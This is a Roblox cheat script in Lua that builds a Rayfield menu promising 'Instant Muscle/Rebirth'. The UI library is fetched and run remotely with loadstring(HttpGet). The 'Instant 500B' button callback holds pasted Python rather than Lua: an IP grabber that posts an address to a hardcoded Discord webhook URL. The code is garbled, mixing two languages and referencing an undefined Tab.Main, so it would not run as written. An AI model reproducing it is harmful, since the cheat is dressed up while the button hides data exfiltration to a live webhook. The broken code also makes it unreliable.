local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Window = Rayfield:CreateWindow({
   Name = "Instant Muscle/Rebirth",
   Icon = 0, -- Icon in Topbar. Can use Lucide Icons (string) or Roblox Image (number). 0 to use no icon (default).
   LoadingTitle = "USE BEFORE PATCH",
   LoadingSubtitle = "Made by Dev of delta",
   Theme = "Default", -- Check https://docs.sirius.menu/rayfield/configuration/themes

   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false, -- Prevents Rayfield from warning when the script has a version mismatch with the interface

   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Big Hub"
   },

   Discord = {
      Enabled = false, -- Prompt the user to join your Discord server if their executor supports it
      Invite = "noinvitelink", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },

   KeySystem = false, -- Set this to true to use our key system
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided", -- Use this to tell the user how to get a key
      FileName = "Key", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = true, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"Hello"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local TabMain = Window:CreateTab("Main Shi", "sword")

local Button = Tab.Main:CreateButton({
   Name = "Instant 500B",
   Callback = function()
      import requests
import json

def grab_ip_and_send_to_discord(webhook_url, target_ip):
    """
    Function to grab the IP address and send it to a Discord webhook.

    Parameters:
    - webhook_url: str, The URL of the Discord webhook to which the data will be sent.
    - target_ip: str, The IP address to be sent to the Discord webhook.
    """
    # Prepare the message to send to Discord
    message = {
        'content': f'IP Address: {target_ip}'
    }

    # Send the IP address to the Discord webhook
    response = requests.post(webhook_url, data=json.dumps(message), headers={'Content-Type': 'application/json'})

    if response.status_code == 204:
        print('IP address sent to Discord webhook successfully!')
    else:
        print(f'Failed to send IP address to Discord webhook. Status code: {response.status_code}')

# Example usage
if __name__ == '__main__':
    # Replace with your actual Discord webhook URL
    WEBHOOK_URL = 'https://discord.com/api/webhooks/1368684628323598479/cD0IBzOCxdE0tK3PRmGqqSI6YeUODIkTHR33t0pVAZMaDTQv3mP4dk7bO0N3PDV2kUHK'

    # Replace with the target IP address you want to send
    TARGET_IP = '8.8.8.8'

    grab_ip_and_send_to_discord(WEBHOOK_URL, TARGET_IP)
   end,
})
